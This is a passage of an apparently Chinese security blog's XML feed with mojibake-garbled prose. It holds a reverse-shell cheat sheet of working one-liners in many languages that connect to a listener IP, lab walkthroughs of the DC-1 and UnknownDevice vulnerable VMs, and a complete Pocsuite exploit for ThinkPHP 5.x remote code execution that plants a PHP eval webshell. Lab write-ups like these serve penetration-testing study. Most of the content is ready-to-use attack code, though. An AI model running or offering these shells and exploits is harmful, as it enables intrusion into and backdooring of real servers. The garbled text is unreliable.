-o hactyphoon@typhoon:/tmp$ chmod +x hacktyphoon@typhoon:/tmp$ ./hack# whoamiroot æœ€åæ¥è¯•ä¸€ä¸‹å†…æ ¸è‡ªåŠ¨åŒ–ææƒè„šæœ¬]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux&WinèŠ±å¼å¼¹shellæŒ‡å—]]></title>
    <url>%2F2019%2F03%2F26%2Freverse-shell%2F</url>
    <content type="text"><![CDATA[NCnc -lvvp 6666 nc -e /bin/sh 192.168.220.140 6666 Bash /bin/bash -i &gt;&amp; /dev/tcp/192.168.220.140/6666 0&gt;&amp;1 PowerShellpowershell.exe -nop -ep bypass -Command "$RcvLFCUFMmdDX='192.168.220.140';$eGdTwRr=6666;$aPjzrf=New-Object System.Net.Sockets.TCPClient($RcvLFCUFMmdDX,$eGdTwRr);$ADWDNku=$aPjzrf.GetStream();[byte[]]$mvkwuYHrYO=0..65535|%&#123;0&#125;;$QPQlsQKzygeCwFV=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'&gt; ');$ADWDNku.Write($QPQlsQKzygeCwFV,0,$QPQlsQKzygeCwFV.Length);while(($KCaBvR=$ADWDNku.Read($mvkwuYHrYO,0,$mvkwuYHrYO.Length)) -ne 0)&#123;$anSGyc=([text.encoding]::ASCII).GetString($mvkwuYHrYO,0,$KCaBvR);try&#123;$gRrnhEIMpeoP=(Invoke-Expression -c $anSGyc 2&gt;&amp;1|Out-String)&#125;catch&#123;Write-Warning 'Something went wrong with execution of command on the target.';Write-Error $_;&#125;;$RcvLFCUFMmdDX0=$gRrnhEIMpeoP+'PS '+(Get-Location).Path+'&gt; ';$RcvLFCUFMmdDX1=($RcvLFCUFMmdDX2[0]|Out-String);$RcvLFCUFMmdDX2.clear();$RcvLFCUFMmdDX0=$RcvLFCUFMmdDX0+$RcvLFCUFMmdDX1;$QPQlsQKzygeCwFV=([text.encoding]::ASCII).GetBytes($RcvLFCUFMmdDX0);$ADWDNku.Write($QPQlsQKzygeCwFV,0,$QPQlsQKzygeCwFV.Length);$ADWDNku.Flush();&#125;;$aPjzrf.Close();if($RcvLFCUFMmdDX3)&#123;$RcvLFCUFMmdDX3.Stop();&#125;;" Python TCP python -c "import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.220.140',6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');s.close();" python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.220.140",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' UDPps:nc -luvvp 6666 python -c "import os;import pty;import socket;soc=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);soc.connect(('192.168.220.140',6666));os.dup2(soc.fileno(),0);os.dup2(soc.fileno(),1);os.dup2(soc.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');soc.close();" Telnettelnet 192.168.220.131 6666 | /bin/bash | telnet 192.168.220.131 6665nc -lvvp 6666 #å‘½ä»¤ä¼ è¾“çª—å£nc -lvvp 6665 #å‘½ä»¤ç»“æœæ˜¾ç¤ºçª—å£ if [ -e /tmp/test ];then rm /tmp/test;fi;mkfifo /tmp/test;cat /tmp/test|/bin/sh -i 2&gt;&amp;1|telnet 192.168.220.140 6666 &gt; /tmp/test if [ -e /tmp/test ];then rm /tmp/test;fi;mknod /tmp/test p &amp;&amp; telnet 192.168.220.140 6666 0&lt;/tmp/test|/bin/bash 1&gt;/tmp/test AWKp=6666;awk -v port="$p" 'BEGIN&#123;soc="/inet/tcp/0/192.168.220.140/"port;while(8095856)&#123;do&#123;printf "shell&gt;"|&amp;soc;soc|&amp; getline inp;if(inp)&#123;while((inp|&amp; getline)&gt;0)print $0|&amp;soc;close(inp);&#125;&#125;while(inp!="exit")close(soc);break&#125;&#125;' /dev/null PHPphp -r "\$soc=fsockopen('192.168.220.140',6666);exec('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');" &lt;?php$sock = fsockopen('192.168.220.131', 6666);$descriptorspec = array( 0 =&gt; $sock, 1 =&gt; $sock, 2 =&gt; $sock ); $process = proc_open('/bin/sh', $descriptorspec, $pipes); proc_close($process);?&gt; Rubyruby -rsocket -e 'f=TCPSocket.open("192.168.220.131",6666).to_i;exec &gt; sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)' ruby -rsocket -e "exit if fork;soc=TCPSocket.new('192.168.220.140',6666);while(soc.print 'shell&gt;';cmd=soc.gets);IO.popen(cmd,'r')&#123;|io|soc.print io.read&#125;end" Perl TCP perl -MSocket -e "\$i='192.168.220.140';\$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i))))&#123;open(STDIN,'&gt;&amp;S');open(STDOUT,'&gt;&amp;S');open(STDERR,'&gt;&amp;S');exec('/bin/sh -i');&#125;;" perl -MIO::Socket::INET -e "exit,if(fork);\$soc=new IO::Socket::INET(PeerAddr,'192.168.220.140:'.6666);\$soc-&gt;send('shell&gt;');STDIN-&gt;fdopen(\$soc,r);$~-&gt;fdopen(\$soc,w);system\$_ while&lt;&gt;;" UDPps:nc -luvvp perl -MIO::Socket::INET -e '$|=1;$soc = new IO::Socket::INET(PeerAddr =&gt; "192.168.220.140:".6666,Proto =&gt; "udp");while(1)&#123;$soc-send("shell&gt;");$soc-&gt;recv($inp,1024);$h=$soc-&gt;peerhost();$p=$soc-peerport();$d=qx($inp);$soc-&gt;send($d);&#125;' JavaRuntime r = Runtime.getRuntime();Process p = r.exec(new String[]&#123;"/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"&#125;);p.waitFor(); Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]&#123;"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"&#125;);p.waitFor(); Lualua -e "require('socket');require('os');t=socket.tcp();t:connect('192.168.220.131','6666');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[æ¸—é€å®æˆ˜:DC-1é¶æœºå…¥ä¾µ]]></title>
    <url>%2F2019%2F03%2F23%2FDC-1%2F</url>
    <content type="text"><![CDATA[0x01 åºç«  ä½œè€…:DCAU éš¾åº¦å®šä½:æœªçŸ¥ï¼Œåˆçº§? ç›®æ ‡:å…±æœ‰äº”ä¸ªflagï¼Œä½†æœ€ç»ˆç›®æ ‡æ˜¯åœ¨rootçš„ä¸»ç›®å½•ä¸­ 0x02 æ–°ç©æ„ è¿™æ¬¡æ¥å°è¯•ä¸€ä¸‹æ–°ç©æ„ï¼ŒNetDiscover è¿™ä¸ªå‘ç°å·¥å…·æˆ‘è¿˜æ˜¯ç¬¬ä¸€æ¬¡ç”¨ï¼Œè™½ç„¶å¬è¯´è¿‡å¾ˆå¤šæ¬¡ # å…ˆæŒ‡å®šä¸€ä¸‹ç½‘å¡sudo netdiscover -i eth2 192.168.135.131 é‰´äºä¸Šæ¬¡çš„ç»éªŒï¼Œè¿™æ¬¡æˆ‘æŒ‡å®šäº†æ›´å…¨é¢çš„æ‰«æ nmap -sV -sS -p- 192.168.135.131 å…ˆè¯•ä¸‹adminï¼ŒAccess deniedï¼Œå¥½å§ é‚£æ¥è·‘ä¸‹ç›®å½• ç„¶åâ€¦..ç„¶åç«™å°±è¢«æˆ‘è·‘å´©äº†,ğŸ¤¦ã¤ï¹âŠ‚ é‡å¯ä¸€ä¸‹è™šæ‹Ÿæœºï¼Œä¸è·‘äº†ä¸è·‘äº†ï¼Œå…ˆçœ‹çœ‹robotså§ é€šè¿‡UPGRADE.txtå’ŒMAINTAINERS.txtåŸºæœ¬å¯ä»¥ç¡®è®¤æ˜¯Drupal 7.x(9 or 10) 0x03 Drupalgeddon2 GetShell å¯¹äºDrupalï¼Œæˆ‘æ‰¾åˆ°ä¸€ä¸ªå†å®³çš„æ´ï¼Œæ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œ Msfä¸­ä¹Ÿæœ‰ï¼Œä½†åˆ©ç”¨å¹¶ä¸é¡ºåˆ© use exploit/unix/webapp/drupal_drupalgeddon2set rhosts 192.168.135.131set payload php/meterpreter_reverse_tcpset lhost 192.168.135.130run åè€Œåœ¨searchsploitä¸­æ‰¾åˆ°ä¸€ä¸ªåŸºäºrubyçš„å¯ç”¨exp æˆåŠŸæ‹¿åˆ°äº†shellï¼Œä½†æˆ‘ä¸æ­»å¿ƒå†åº¦å°è¯•msf set payload php/reverse_phprun äº‹å®è¯æ˜ï¼Œèƒ½å¼¹å›æ¥ æˆ‘å†æ¬¡è¿›è¡Œä¸€äº›æµ‹è¯• php/meterpreter_reverse_tcp PHP Meterpreter, Reverse TCP Inlinephp/meterpreter/reverse_tcp PHP Meterpreter, PHP Reverse TCP Stagergeneric/shell_reverse_tcp Generic Command Shell, Reverse TCP Inlinephp/reverse_php PHP Command Shell, Reverse TCP (via PHP) å‰ä¸¤è€…ä¸€ä¸ªæ˜¯ä½¿ç”¨å‘½ä»¤è¡Œå›è¿ï¼Œä¸€ä¸ªæ˜¯ä½¿ç”¨phpå›è¿ï¼Œphpå›è¿èƒ½è¿ä¸Šä½†æ— æƒé™ è€Œæ™®é€šçš„genericå’Œphpéƒ½èƒ½æ­£å¸¸å·¥ä½œï¼Œå¥½çš„ï¼Œå¯ä»¥è¯´æ˜æ˜¯meterpreterçš„é”… ç„¶è€Œä½“éªŒè¿˜ä¸å¦‚é‚£ä¸ªrubyçš„expï¼Œå’~ 0x04 Flag1&amp;Flag2è¿›æ¥webç›®å½•ä¸‹æœ‰ä¸€ä¸ªflag1 DC-1&gt;&gt; cat flag1.txtEvery good CMS needs a config file - and so do you. å¾ˆæ˜æ˜¾çš„æç¤ºï¼Œä¸€é¡¿æœç´¢ï¼ŒDrupalçš„é…ç½®æ–‡ä»¶åœ¨sites/default/settings.php Getflag2db:drupaldbusername:dbuserpassword:R0ck3t é‚£æˆ‘ä»¬è¿ä¸Šå»mysqlçœ‹çœ‹ mysql -udbuser -pR0ck3t ç„¶è€Œä¹±ä¸ƒå…«ç³Ÿå•¥æœ‰ç”¨çš„ä¿¡æ¯éƒ½æ‰¾ä¸åˆ° æœŸé—´æˆ‘åˆé‡æ–°å¼¹äº†ä¸€æ¬¡shellï¼Œåæ¥å‘ç° å“‡å’”å’”ï¼Œä½ æ‡‚çš„ gcc -o2 up.c éšå æˆ‘åœ¨æœ¬æœºæ­å»ºäº†ä¸€ä¸ªç®€æ˜“çš„pythonæœåŠ¡å™¨ å¹¶wgetæ‹¿åˆ°exp chmod +x 2./2whoamiroot ç„¶åå†çœ‹ä¸€ä¸‹åˆ«çš„è·¯ 0x05 SSHçˆ†ç ´ææƒè¿™æ—¶æˆ‘åˆæƒ³èµ·äº†flag2çš„æç¤ºï¼Œè·‘å­—å…¸.åŒæ—¶passwdä¸­ä¸€ä¸ªè´¦å·å¸å¼•äº†æˆ‘çš„æ³¨æ„ å°±æ˜¯å®ƒäº†ã€‚ [22][ssh] host: 192.168.135.131 login: flag4 password: orange æ©™å­ï¼Œå‘ç°homeä¸‹è¿˜æœ‰ä¸ªflag4 0x06 åŸºäºfindææƒ æ³¨æ„ï¼šæˆ‘åœ¨å‘ç°flag4å‰å°±å·²ç»é€šè¿‡findæ‹¿åˆ°rootäº†ï¼Œä¸ºäº†æ–¹ä¾¿è§‚çœ‹æˆ‘æŠŠè¿‡ç¨‹æ”¾åˆ°äº†è¿™é‡Œï¼Œæ‰€ä»¥æœ‰äº›å›¾ç‰‡ä¸­çš„ç»ˆç«¯åå¯¹ä¸ä¸Šäº† find / -perm -4000 2&gt;/dev/null find / -exec /bin/sh \; -quit findä¸­æä¾›äº†ä¸€å¤„å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½ 0x07 Flag3è™½ç„¶å·²ç»æ‹¿åˆ°äº†rootå¹¶é›†é½äº†å››ä¸ªflag ä½†å¹¶æ²¡æœ‰æ‰¾åˆ°flag3ï¼ŒåŒæ—¶æƒ³èµ·flag2ä¸­å°†æˆ‘ä»¬å¼•å‘æ•°æ®åº“çš„ç›®çš„ æ•°æ®åº“æˆ‘ä»”ç»†ç¿»æ‰¾è¿‡ï¼Œå¹¶æ²¡æœ‰ç‰¹æ®Šçš„ä¸œè¥¿ï¼Œæˆ‘ä»¬èƒ½åšçš„ä¸œè¥¿ä¸å¤šæ¯”å¦‚:å¾—åˆ°ç®¡ç†å‘˜å¯†ç  é‚£æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Œç™»å½•åå°? å¦‚æœæ˜¯ä¸€èˆ¬æƒ…å†µï¼Œä¼°è®¡åªæœ‰è·‘johnäº†ï¼Œä½†è¿™æ¬¡ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬çŸ¥é“ç› å•Šï¼è¿˜æœ‰æ›´çœäº‹çš„æ–¹æ³•ï¼Œdrupalè‡ªå¸¦äº†äº†åŠ å¯† $S$DaVfvVLfyV4XMvqLm29dqXIRcxQRwUfkmDpfTKmULeuNPKDBk6p. åˆ°æ•°æ®åº“ä¸­ update users set pass = '$S$DaVfvVLfyV4XMvqLm29dqXIRcxQRwUfkmDpfTKmULeuNPKDBk6p.' where uid=1; çœ‹æ ·å­æˆ‘æ˜¯ç›´æ¥è·³è¿‡äº†hintï¼Œæ‹¿rootäº†emmmmmm]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[æ¸—é€å®æˆ˜:UnknownDeviceé¶æœºå…¥ä¾µ]]></title>
    <url>%2F2019%2F03%2F22%2FUnknownDevice%2F</url>
    <content type="text"><![CDATA[0x01 å‰è¨€ éš¾åº¦å®šä½:ä¸­çº§ ä½œè€…ï¼šAjay Verma ç›®æ ‡:è·å¾—rootå¹¶é˜…è¯»/root/flag.txt 0x02 ä¸»æœºæ‰«æå…ˆæ‰«ä¸€æ³¢ Nmap scan report for 192.168.135.129Host is up (0.0012s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION31337/tcp open http SimpleHTTPServer 0.6 (Python 2.7.14)|_http-server-header: SimpleHTTP/0.6 Python/2.7.14|_http-title: Website By Unknowndevice64 MAC Address: 00:0C:29:F9:6F:F5 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hop port 31337 pythonçš„ç®€æ˜“HTTPServer ä»£ç æœ‰hint 0x03 å›¾ç‰‡éšå†™æœ¯ æ˜¯å›¾ç‰‡éšå†™ï¼Œå…ˆåæ‹¿HxDå’ŒStegsolveåˆ†æè¿‡ï¼Œéƒ½ä¸è¡Œ çœ‹äº†wpæ‰çŸ¥é“è¦ç”¨steghideï¼Œå‡ºå¸ˆä¸åˆ© steghide --extract -sf key_is_h1dd3n.jpg å¯†ç æ˜¯h1dd3n å¾—åˆ°ä¸€ä¸²å¥‡æ€ªçš„ä¸œè¥¿ ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++.-----------------.&lt;----------------.--.++++++.---------.&gt;-----------------------.&lt;&lt;+++.++.&gt;+++++.--.++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++.-----------------. çœ‹ç€è¿™ä¸²ï¼Œå€’æ˜¯æƒ³åˆ°äº†ä»¥å‰æ¥è§¦è¿‡çš„jsfuckï¼Œä½†å…¶å®åˆä¸ä¸€æ · æŸ¥äº†äº›èµ„æ–™æ„Ÿè§‰å¯èƒ½æ˜¯BrainFuck ud64:1M!#64@ud è¿˜ä»¥ä¸ºæ˜¯å•¥åŠ å¯†ï¼ŒæŠ˜è…¾è®¸ä¹…ï¼Œå†æ¬¡èµ°æŠ•æ— è·¯â€¦.å¶ç„¶é—´å‘ç°ï¼Œè¿™åå­—emmm è¿™æ˜¯ç”¨æˆ·å+å¯†ç ?å¯æ˜¯æ²¡æœ‰å¯ä»¥ç™»å½•çš„åœ°æ–¹å•Šï¼Œç«¯å£åªæœ‰31337 sudo nmap -sV -p 1-65535 192.168.135.129 æŒ‡å®šå…¨ç«¯å£ï¼Œå†æ‰«ä¸€æ¬¡ï¼Œ1337æœ‰SSHï¼Œçœ‹æ¥å°±æ˜¯å®ƒäº† è¿›æ¥äº†??æ®Šä¸çŸ¥çœŸæ­£çš„æŒ‘æˆ˜æ‰åˆšåˆšå¼€å§‹ 0x04 rbashé™åˆ¶é€ƒé€¸ä¸Šæ¥å°±æ˜¯ls ud64@unknowndevice64_v1:~$ ls-rbash: /bin/ls: restricted: cannot specify `/' in command names å…ˆæ¥çœ‹çœ‹è¿™ä¸ªrbashæ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ è¿™ä¹ˆå˜æ€???ï¼Œç»è¿‡ä¸€ç•ªæœç´¢ å‘ç°å¯ä»¥é€šè¿‡æŒ‰ä¸¤ä¸‹tabé”®è°ƒå‡ºå¯ä»¥æ‰§è¡Œçš„ç¨‹åº æœ€ç»ˆæ‰¾åˆ°ä¸¤å¤„å¯ç»•è¿‡é™åˆ¶shellçš„æ–¹æ³• vi æ‰§è¡Œ!/bin/sh export PATH=$PATH:/bin/ export PATH=$PATH:/usr/bin ä½†æƒé™å—é™ï¼Œç¯å¢ƒå˜é‡æ˜¯åªè¯»ï¼Œåªæœ‰viäº† å¾ˆå¥½ï¼Œç›®å‰å·²ç»è·å¾—äº†ä¸€ä¸ªâ€™â€™è¾ƒâ€™â€™æ­£å¸¸çš„shellï¼Œä½†æ˜¯æƒé™ä¾ç„¶å¾ˆä½ äº‹å®ä¸Šè¿™åªæ˜¯åœ¨viä¸­è¿è¡Œçš„ä¸€ä¸ªâ€™shellâ€™ï¼Œé‚£ä¹ˆå…ˆæŠŠå®ƒæåˆ°æ™®é€šçš„shell æ¯”å¦‚è¿™æ · è¿™æ˜¯å› ä¸ºåœ¨viçš„shellä¸­å·²ç»æ‹¥æœ‰äº†ç¯å¢ƒå˜é‡çš„å†™å…¥æƒé™äº† 0x05 ç ´é‡œæ²‰èˆŸstraceåˆ°rootç°åœ¨ä¾æ—§æ²¡æœ‰åŠæ³•è¯»åˆ°rootä¸‹çš„flag æŸ¥çœ‹äº†passwdï¼Œé™¤rootå¤–ï¼Œæœ‰bashçš„è´¦æˆ·è¿˜æœ‰ä¸€ä¸ªoperator root:x:0:0::/root:/bin/bashoperator:x:11:0:operator:/root:/bin/bashud64:x:1000:1000::/home/ud64:/bin/rbash ä½†ä¸çŸ¥é“å¯†ç ï¼Œä¹Ÿæ‰¾ä¸åˆ°å¯è¡Œçš„å†…æ ¸ææƒ å†åº¦é™·å…¥åƒµå±€ æœ€ç»ˆï¼Œåœ¨å…ˆåæ£€æŸ¥äº†ç¯å¢ƒå˜é‡å’Œè¿›ç¨‹åï¼Œåœ¨æ£€æŸ¥sudoå¯æ‰§è¡Œå‘½ä»¤æ—¶å‘ç° å¯ä»¥ç”¨sudoæ‰§è¡Œ/usr/bin/sysud64ä½†æˆ‘å¹¶ä¸æ¸…æ¥šè¿™æ˜¯ä»€ä¹ˆç¨‹åºï¼Œå¹¸å¥½æœ‰help å…¶å®è¿™æ˜¯straceï¼Œä¸€ä¸ªç”¨ä»¥è¯Šæ–­ï¼Œè°ƒè¯•çš„ç¨‹åºï¼Œæ²¡é”™è°ƒè¯•å°±æ„å‘³ç€è¿è¡Œ! sudo sysud64 -o /dev/null /bin/bash -i &gt;&amp; /dev/tcp/192.168.135.130/4444 0&gt;&amp;1 ä»¥rootæƒé™è¿›è¡Œä¸€æ¬¡å¼¹shellå¹¶æŠŠæ‰€æœ‰è°ƒè¯•è¾“å‡ºåˆ°æœ€çˆ±çš„é»‘æ´ äº‹åå‘ç°å…¶å®å¯ä»¥ç›´æ¥æ‰§è¡Œ/bin/bash sudo sysud64 -o /dev/null /bin/bash æˆ‘ä¸ç®¡ï¼Œæˆ‘å°±æ˜¯è¦å¼¹ï¼Œå°å£°é€¼é€¼ 0x06 GetFlagA hacker does for love what others woud not do for money.]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€å®æˆ˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åŸºäºPocsuiteçš„ThinkPHP 5.x è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ©ç”¨]]></title>
    <url>%2F2019%2F01%2F11%2Fthinkphp-5-x-pocsuite%2F</url>
    <content type="text"><![CDATA[åŠé†‰åŠé†’æ—¥å¤æ—¥,èŠ±è½èŠ±å¼€å¹´å¤å¹´ã€‚ 2019äº†ã€‚ æ¼æ´åˆ†æ æ¼æ´åˆ†ææœ‰å¾ˆå¤šå¤§ä½¬å·¨ä½¬åšè¿‡äº†ï¼Œæˆ‘å°±ä¸çŒ®ä¸‘äº†emmmmç»™å¤§å®¶æ‰¾äº†ä¸€ç¯‡åˆ†æpaperï¼Œå»ºè®®å»ç ”ç©¶ç ”ç©¶ æ°´æ³¡æ³¡ æ¼æ´è¯¦æƒ… æ¼æ´å½±å“:Thinkphp 5.0.23åŠ5.1.31ä»¥ä¸‹(å³12æœˆ9æ—¥å®‰å…¨æ›´æ–°å‰æ‰€æœ‰ç‰ˆæœ¬) vulnspyçš„æ¼æ´æºç  å®˜æ–¹æ¼æ´æºç  å®˜æ–¹githubæºç  Thinkphp v5.0.xè¡¥ä¸ Thinkphp v5.1.xè¡¥ä¸ seebug æ³¨æ„:å®˜ç½‘åªæœ‰5.0.xçš„ç‰ˆæœ¬ï¼Œæµ‹è¯•5.1.xéœ€è¦åˆ°githubè‡ªå·±cloneä¸€ä¸ªå†ç”¨composerå®‰è£…æˆ–è€…ç”¨vulnspyçš„ composer å…¨å¹³å°å…±æœ‰å…·æœ‰æ¼æ´çš„ç±»å¯ä»¥ç»§ç»­æŒ–æ˜æ›´å¤špayloadï¼Œæˆ‘å°±ä¸(tai)æ¥(cai)äº†(le) think\Routethink\Loaderthink\Errorthink\Appthink\Envthink\Configthink\Hookthink\Langthink\Requestthink\Log ç¼–å†™å‰å‡†å¤‡å¯¹äºç½‘ä¸Šçš„payloadè¿›è¡Œäº†æ”¶é›†,æœ¬æ‰“ç®—åŸºäºä»¥ä¸‹å››ä¸ªpayloadè¿›è¡ŒPocçš„ç¼–å†™ Request/inputindex.php?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1index.php?s=index/\think\Request/input&amp;filter=system&amp;data=echo%20%22&lt;?php%20eval($_POST[cmd])?&gt;%22%20&gt;%20a.php Request/cacheindex.php?s=index/\think\request/cache&amp;key=1|phpinfoindex.php?s=index/\think\request/cache&amp;key=dir|systemindex.php?s=index/\think\request/cache&amp;key=echo%20%22&lt;?php%20eval($_POST[cmd])?&gt;%22%20&gt;%20a.php|system container/invokefunctionindex.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoamiindex.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E app/invokefunctionindex.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoamiindex.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%22&lt;?php%20phpinfo();?&gt;%22%20&gt;%20info.phpindex.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E è¿˜æœ‰ä¸€ä¸ªè²Œä¼¼åªèƒ½å†™æ–‡ä»¶çš„ index.php?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20eval($_POST[123]);?%3C Payloadæµ‹è¯•æµ‹è¯•çš„æ—¶å€™å‘ç°äº†äº›é—®é¢˜ å‰ä¸‰ä¸ªpaylaodå¯¹äº5.0.xæ— æ•ˆï¼Œåªæœ‰ç¬¬å››ä¸ªæœ‰æ•ˆ è€Œ5.1.xåˆ™é€šæ€ ç»“åˆæ°´æ³¡æ³¡çš„åˆ†æ é‚£å°±åªæœ‰app/invokefunctionä¸€æ¡è·¯å¯ä»¥èµ°äº† Pocçš„ç¼–å†™#!/usr/bin/env python# coding: utf-8from pocsuite.net import reqfrom pocsuite.poc import POCBase, Outputfrom pocsuite.utils import registerclass ThinkphpPoC(POCBase): vulID = '97767' version = '1' author = ['p1n3'] vulDate = '2019-01-11' createDate = '2019-01-11' updateDate = '2019-01-11' references = ['https://www.seebug.org/vuldb/ssvid-97767'] name = 'Thinkphp 5.0.23åŠ5.1.31ä»¥ä¸‹ è¿œç¨‹ä»£ç æ‰§è¡Œ' appPowerLink = 'http://www.thinkphp.cn/' appName = 'Thinkphp' appVersion = '5.x' vulType = 'RCE' desc = ''' ç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹ å¯èƒ½çš„è¿œç¨‹ä»£ç æ‰§è¡Œå¯¼è‡´getshellï¼Œå—å½±å“åŒ…æ‹¬Thinkphpå…¨ç‰ˆæœ¬ï¼Œå»ºè®®æ›´æ–°åˆ°æœ€æ–°ç‰ˆæˆ–å¼€å¯å¼ºåˆ¶è·¯ç”± ''' samples = [''] def _verify(self): result = &#123;&#125; payload = self.url + '/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array' \ '&amp;vars[0]=print_r&amp;vars[1][]=fae0b27c451c728867a567e8c1bb4e53' response = req.get(payload) # md5(666) çš„å€¼ if 'fae0b27c451c728867a567e8c1bb4e53' in str(response.content): result = &#123;'VerifyInfo': &#123;&#125;&#125; result['VerifyInfo']['payload'] = payload return self.parse_result(result) def _attack(self): result = &#123;&#125; info = &#123; 'ResultCode': &#123; 'a': False, 'b': False &#125; &#125; payload1 = self.url + '/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array' \ '&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20eval($_POST[666]);?%3E' payload2 = self.url + '/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array' \ '&amp;vars[0]=system&amp;vars[1][]=echo%20%22&lt;?php%20eval($_POST[666]);?&gt;%22%20&gt;%20info.php' req.get(payload1) if req.get(self.url + '/info.php').status_code == 200: result = &#123;'AttackInfo': &#123;&#125;&#125; info['ResultCode']['a'] = True result['AttackInfo']['payload'] = payload1 else: req.get(payload2) if req.get(self.url + '/info.php').status_code == 200: result = &#123;'AttackInfo': &#123;&#125;&#125; info['ResultCode']['b'] = True result['AttackInfo']['payload'] = payload2 if info['ResultCode']['a'] or info['ResultCode']['b']: result['AttackInfo']['shell'] = self.url+'/info.php' result['AttackInfo']['pass'] = '666' return self.parse_result(result) def parse_result(self, result): output = Output(self) if result: output.success(result) else: output.fail('The vulnerability does not appear to be available!') return outputregister(ThinkphpPoC) Pocæµ‹è¯• è¿˜æ˜¯ç¬¬ä¸€æ¬¡ç”¨Pocsuiteï¼Œå†™çš„ä¸å¥½â€¦ä½ æ¥æ‰“æˆ‘å‘€ ç›¸æ¯”pentestDBç­‰ï¼ŒPocsuiteä½“éªŒéå¸¸ä¸é”™ï¼Œæ‰“ç®—ä»¥åå°±ä¸€ç›´ä½¿ç”¨Pocsuiteå¥½äº†(å¦‚æœæœ‰æ›´å¥½çš„æ¡†æ¶è¯·åŠ¡å¿…ç§ä¿¡æˆ‘) verifyæ¨¡å¼å¿˜æˆªå›¾äº† attackæ¨¡å¼ä¼šç›´æ¥åœ¨åŒç›®å½•ä¸‹å†™ä¸€å¥è¯æœ¨é©¬ ç¥­å‡ºæ³•å™¨ä¸­å›½èšå‰‘ æ–‡ä»¶æ˜¯info.php å¯†ç 666 å¾ˆå¥½ enjoy it]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonæ‰“é€ åŸºäºscapyçš„æ‰«æå™¨]]></title>
    <url>%2F2018%2F11%2F17%2Fweb-scan%2F</url>
